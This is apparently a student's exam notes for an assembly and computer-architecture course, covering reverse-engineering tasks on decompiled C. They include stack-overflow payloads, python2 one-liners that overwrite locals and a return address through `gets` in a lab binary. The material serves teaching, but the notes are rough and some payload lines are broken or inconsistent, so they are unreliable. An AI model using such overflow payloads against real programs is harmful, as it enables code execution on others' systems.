@@ -1,0 +1,113 @@
+Examen CD 2024 IOCLA VAR 1
+
+
+
+
+task 3:
+
+
+a)
+
+
+a = 4210752250 adica 0xFAFAFAFA
+b = 1000 adica 0xFA * 4
+0xFA = 250
+
+/* TODO a: Find `compute` parameters so that calling `compute`
+ * function will return 0.
+ */
+void todo_a()
+{
+	int res;
+
+	res = compute(0, 0);
+	if (!res) 
+
+		printf("a) Perfect! Go on!\n");
+	else
+		printf("a) Wrong answer. Try again\n");
+}
+
+undefined4 compute(uint param_1,int param_2)
+{
+  if ((999 < param_2) &&
+     (param_2 ==
+      (param_1 & 0xff) + ((param_1 & 0xff00) >> 8) + ((param_1 & 0xff0000) >> 0x10) +
+      (param_1 >> 0x18))) {
+    return 0;
+  }
+  return 1;
+}
+
+
+
+
+b)
+
+/* TODO b: Read `n` and `vec` from standard input so that
+ * `check_array` function will return 0.
+ */
+void todo_b(void) {
+	int res;
+	int a[] = {2, 2, 2, 2, 2, 2};
+	int b[] = {0, 0, 0, 0, 0, 0};
+
+	res = check_arrays(a, ARRAY_SIZE(a), b, ARRAY_SIZE(b));
+	if (!res)
+		printf("b) Perfect! Go on!\n");
+	else
+		printf("b) Wrong answer. Try again!\n");
+}
+
+
+int check_arrays(int *param_1,int param_2,int *param_3,int param_4)
+
+{
+  int iVar1;
+  
+  if ((param_2 == param_4) && (4 < param_2)) {
+    iVar1 = 0;
+    while( true ) {
+      if (param_2 == 0) {
+        return iVar1;
+      }
+      if (*param_1 < 2) break;
+      iVar1 = iVar1 + *param_1 * *param_3;
+      param_1 = param_1 + 1;
+      param_3 = param_3 + 1;
+      param_2 = param_2 + -1;
+    }
+  }
+  return 1;
+}
+
+
+
+c)
+
+void read_string(void)
+
+{
+  int local_64 [23];
+  int local_8;
+  
+  gets((char *)local_64);
+  if ((local_8 == 0x12345678) && (local_64[0] == 0x12345678)) {
+    return;
+  }
+  printf(notok_str);
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+
+080494b1
+
+python2 -c 'print "\xef\xbe\xad\xde" + "A" * 2 * 4 + "\xef\xbe\xad\xde" + "\xef\xbe\xad\xde" + "\xb1\x94\x04\x08"' > payload
+
+python2 -c 'print "\x78\x56\x34\x12" + "A" * 22 * 4 + "\x78\x56\x34\x12" + "\x08\x04\x94\xaa"' > payload
+
+python2 -c 'print "\xef\xbe\xad\xde" * 65 + "\xb1\x94\x04\x08"' > payload
+
+un ex random:
+
+python -c 'print "A" * 64 + "\xbe\xba\xfe\xca" + "A" * 4 + "\x82\x91\x04\x08" + "\n" + "A" * 72 + "\xef\xbe\xad\xde" + ' | ./attack 
